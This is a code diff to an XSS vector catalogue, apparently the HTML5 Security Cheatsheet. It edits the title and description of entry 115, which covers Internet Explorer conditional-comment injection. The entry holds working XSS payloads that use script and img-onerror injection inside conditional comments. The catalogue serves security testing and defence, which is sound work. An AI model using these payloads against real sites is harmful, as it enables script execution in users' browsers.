@@ -3948,11 +3948,11 @@ var items =
         'tags'       : ['xss', 'css', 'google chrome', 'safari', 'trick', 'notation'],
         'reporter'   : '.mario, LeverOne'
     },
-    { /* ID 115 - Internet Explorer conditional comments - XSS via [if]> */
+    { /* ID 115 - Internet Explorer conditional comments - XSS via [if]> and <img> injection */
         'id'         : 115,
         'category'   : 'html', 
         'name'       : {
-            'en' : 'Internet Explorer conditional comments - XSS via [if]>',
+            'en' : 'Internet Explorer conditional comments - XSS via [if]> and <img> injection',
             'ja' : '',
             'ru' : '',
             'cs' : '',
@@ -3960,7 +3960,7 @@ var items =
         },
         'data'       : '<!--[if]><script>%js_alert%</script -->\r\n<!--[if<img src=x onerror=%js_alert%//]> -->',        
         'description': {
-            'en' : 'Conditional comments on Internet Explorer can cause trouble as soon as an attcker is able to inject rectangular brackets wrapping the words if and endif with almost arbitrary suffixes. A condition always being true will lead to immediate parsing of the enclosed markup on all tested Internet Explorer versions. The tested example injects an <img> tag into the comment condition leading to immediate JavaScript execution as well.',
+            'en' : 'Conditional comments on Internet Explorer can cause trouble as soon as an attcker is able to inject rectangular brackets wrapping the words if and endif with almost arbitrary suffixes. A condition always being true will lead to immediate parsing of the enclosed markup on all tested Internet Explorer versions. The second example injects an <img> tag into the comment condition leading to immediate JavaScript execution as well.',
             'ja' : '',
             'ru' : '',
             'cs' : '',
